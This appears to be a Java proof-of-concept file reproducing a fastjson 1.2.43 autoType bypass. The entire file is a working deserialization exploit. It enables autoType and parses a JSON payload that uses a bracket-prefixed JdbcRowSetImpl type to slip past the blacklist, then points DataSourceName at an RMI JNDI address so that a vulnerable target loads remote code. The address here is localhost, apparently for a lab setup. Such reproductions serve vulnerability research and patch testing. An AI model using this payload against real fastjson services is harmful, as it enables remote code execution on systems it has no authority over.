package com.yyjccc.fastjson.exp.bypass.autotype;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class fastjson1243 {

	public static void main(String[] args) {
		ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
		JSON.parse(payload());
	}

	public static String payload(){

		String jndiAddress="rmi://127.0.0.1:8085/ngmjzGDj";
		String data="{\n\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\n\"DataSourceName\":\""+jndiAddress+"\",\n\"AutoCommit\":false\n}";
		System.out.println(data);
		return data;
	}
}
